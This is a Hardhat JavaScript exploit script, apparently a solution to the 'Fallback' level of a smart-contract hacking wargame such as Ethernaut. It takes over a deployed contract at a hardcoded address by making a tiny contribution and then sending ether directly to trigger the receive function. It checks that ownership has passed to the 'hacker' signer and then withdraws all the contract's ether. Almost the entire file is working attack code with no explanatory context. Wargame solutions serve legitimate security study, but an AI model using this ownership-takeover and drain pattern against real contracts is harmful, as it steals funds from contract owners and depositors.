// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Fallback";
  const contractAddress = "0xe25CCD57CCcE3295B2526Cc20f0Bca305bf991Bf";

  // We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // Get current contract owner
  const owner = await contract.owner();
  console.log(`🙍‍♂️ Owner:\n ${owner} \n`);

  // Get accounts
  const [hackerSigner] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);

  // 👿 Hacking the contract
  // Incrementing my contribution
  const incrementingContributionTx = await contract
    .connect(hackerSigner)
    .contribute({ value: hre.ethers.utils.parseEther("0.0001") });
  await incrementingContributionTx.wait((confirms = 1));

  // Getting ownership of the contract
  let currentOwner = await contract.owner();
  console.log(`🙍‍♂️ Current contract owner:\n ${currentOwner} \n`);
  const sendEtherToReceiveFunctionTx = await hackerSigner.sendTransaction({
    value: hre.ethers.utils.parseEther("0.0001"),
    to: contractAddress,
  });
  await sendEtherToReceiveFunctionTx.wait((confirms = 1));

  // Checking we are the current contract owner
  currentOwner = await contract.owner();
  if (currentOwner === hackerSigner.address) {
    console.log(`✅ Contract owner changed to:\n ${currentOwner} \n`);
  } else {
    console.log(`❌ Contract owner not changed`);
  }

  // Withdrawing all ether
  const withdrawAllEtherTx = await contract.connect(hackerSigner).withdraw();
  await withdrawAllEtherTx.wait((confirms = 1));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
